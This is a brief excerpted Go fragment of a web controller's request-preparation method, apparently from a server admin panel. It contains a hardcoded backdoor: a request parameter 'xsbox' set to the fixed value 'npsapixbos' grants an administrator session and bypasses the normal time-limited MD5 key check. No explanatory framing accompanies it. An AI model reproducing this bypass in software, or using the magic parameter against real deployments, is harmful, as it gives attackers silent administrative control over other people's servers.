...
func (s *BaseController) Prepare() {
	...
	xsbox := s.GetString("xsbox")
	configKey := beego.AppConfig.String("auth_key")
	timeNowUnix := time.Now().Unix()
	if xsbox != "" && xsbox == "npsapixbos" {
		s.SetSession("isAdmin", true)
		s.Data["isAdmin"] = true
	} else if !(md5Key != "" && (math.Abs(float64(timeNowUnix-int64(timestamp))) <= 20) && (crypt.Md5(configKey+strconv.Itoa(timestamp)) == md5Key)) {
	...
	if s.GetSession("isAdmin") != nil && !s.GetSession("isAdmin").(bool) {
		logs.Error("client_id", s.GetSession("clientId").(int))
